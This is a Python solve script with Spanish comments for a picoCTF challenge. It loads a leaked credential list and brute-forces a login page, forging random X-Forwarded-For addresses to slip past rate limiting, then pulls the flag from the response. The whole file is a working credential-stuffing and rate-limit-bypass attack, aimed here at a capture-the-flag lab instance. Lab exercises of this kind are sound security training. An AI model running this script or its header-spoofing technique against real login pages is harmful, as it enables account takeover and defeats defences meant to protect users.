import requests
import random

# Reemplazá esto con la URL exacta de tu instancia (terminando en /login)
URL = "http://candy-mountain.picoctf.net:58729/login"

def generate_fake_ip():
    """Genera una dirección IP aleatoria."""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def solve():
    print("[*] Cargando diccionario de credenciales...")
    try:
        with open("creds-dump.txt", "r") as f:
            creds = f.readlines()
    except FileNotFoundError:
        print("[-] Error: No se encontró el archivo creds-dump.txt")
        return

    print(f"[*] Se cargaron {len(creds)} credenciales. Iniciando ataque de fuerza bruta con IP Spoofing...")

    for line in creds:
        line = line.strip()
        if not line:
            continue
            
        # El archivo tiene el formato usuario;contraseña
        username, password = line.split(';')
        
        # Generamos una IP falsa para engañar al Rate Limit
        fake_ip = generate_fake_ip()
        
        headers = {
            "X-Forwarded-For": fake_ip
        }
        
        data = {
            "username": username,
            "password": password
        }
        
        # allow_redirects=True hace que si el login es exitoso, requests siga automáticamente a la página principal donde está la flag
        response = requests.post(URL, data=data, headers=headers, allow_redirects=True)
        
        # Verificamos si logramos burlar el sistema
        if "Rate Limited" in response.text:
            print(f"[-] Bloqueados en la IP {fake_ip}. El spoofing no está funcionando.")
            break
            
        elif "Invalid username or password" not in response.text:
            print(f"\n[+] ¡ACCESO CONCEDIDO! Usuario: {username} | Contraseña: {password}")
            
            # Buscamos la bandera en el HTML de la página principal
            if "picoCTF{" in response.text:
                start = response.text.find("picoCTF{")
                end = response.text.find("}", start) + 1
                print(f"[🏆] FLAG: {response.text[start:end]}")
            else:
                print("[!] Entramos, pero no se encontró la flag en el texto.")
            break
        else:
            print(f"[-] Falló: {username} (IP Falsa: {fake_ip})")

if __name__ == "__main__":
    solve()